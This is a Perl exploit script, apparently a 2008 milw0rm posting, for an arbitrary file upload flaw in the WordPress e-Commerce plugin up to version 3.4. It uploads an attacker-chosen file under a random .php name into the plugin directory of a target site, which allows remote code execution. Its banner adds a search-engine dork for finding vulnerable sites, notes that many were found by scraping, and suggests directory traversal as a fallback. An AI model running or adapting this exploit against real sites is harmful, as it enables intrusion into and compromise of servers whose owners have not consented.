<html><head><title>Wordpress Plugin e-Commerce <= 3.4 Arbitrary File Upload Exploit</title></head><pre>#!/usr/bin/perl

use warnings;
use strict;
use LWP::UserAgent;
use HTTP::Request::Common;

my $fname = rand(99999) . &quot;.php&quot;; # no int()

print &lt;&lt;INTRO; # messy print i know..
- Wordpress Plugin e-Commerce &lt;= 3.4 Arbitrary File Upload -
            Discovered &amp;&amp; Coded by: t0pP8uZz
            Discovered on: 20 October 2008
  
  Theres no current vulnerabilitys for this plugin, but the
  vulnerability explained here no longer exists in the later
  versions of the plugin, due to a code rewrite.
  
  In testing this vulnerability, i wrote a scraping content
  program, and found ALOT of vulnerable sites.
  
  This exploit will upload a selected file to the...
  ... /wp-content/plugins/wp-shopping-cart/ directory.
  
  If the directory is not writable (rare cases) you can
  mod this exploit and use the insecure GET variable
  &quot;imagedir&quot; to directory traversal.. so you can upload
  in diffrent directorys.
  
  Contact: irc.rizon.net #sectalk
  
  Dork: inurl:&quot;/wp-content/plugins/wp-shopping-cart/&quot;

INTRO

print &quot;\nEnter URL(ie: http://site.com/mambo): &quot;;
    chomp(my $url=&lt;STDIN&gt;);
    
print &quot;\nEnter File Path(path to local file to upload): &quot;;
    chomp(my $file=&lt;STDIN&gt;);
    
my $ua = LWP::UserAgent-&gt;new;
my $re = $ua-&gt;request(POST $url . '/wp-content/plugins/wp-shopping-cart/image_processing.php',
                      Content_Type =&gt; 'form-data',
                      Content      =&gt; [ Submit =&gt; &quot;Add&quot;, image =&gt; [ $file, $fname, Content_Type =&gt; 'plain/text' ], ] );

die &quot;Exploit Failed: HTTP POST Failed!&quot; unless $re-&gt;is_success;

if($re-&gt;content =~ /Fatal error/i) { 
    print &quot;Complete! To see if exploit was successfull visit the following URL for your uploaded file.\n&quot;;
    print &quot;Uploaded File: &quot; . $url . &quot;/wp-content/plugins/wp-shopping-cart/&quot; . $fname . &quot;\n&quot;;
} else
{
    print &quot;Exploit Failed! Target host not vulnerable!\n&quot;;
}
exit;

# milw0rm.com [2008-10-29]</pre></html>